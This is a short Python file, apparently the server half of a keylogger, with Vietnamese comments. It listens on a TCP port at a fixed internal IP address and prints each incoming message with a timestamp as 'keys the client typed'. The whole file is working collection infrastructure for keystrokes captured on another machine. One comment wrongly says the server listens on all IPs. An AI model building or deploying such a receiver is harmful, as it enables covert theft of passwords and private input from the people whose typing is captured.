# key_server.py
import socket
from datetime import datetime

HOST = '10.10.30.251'   # Lắng nghe tất cả các IP
PORT = 5000        # Cổng TCP

def start_server():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((HOST, PORT))
    server_socket.listen(1)
    print(f"📡 Server đang lắng nghe tại {HOST}:{PORT} ...")

    conn, addr = server_socket.accept()
    print(f"✅ Kết nối từ: {addr}")

    try:
        while True:
            data = conn.recv(1024)
            if not data:
                break

            key = data.decode('utf-8')
            current_time = datetime.now().strftime("%H:%M:%S")
            print(f"[{current_time}] Phím client đã nhập: {key}")

    except KeyboardInterrupt:
        print("\n🛑 Đã dừng server.")
    finally:
        conn.close()
        server_socket.close()

if __name__ == "__main__":
    start_server()
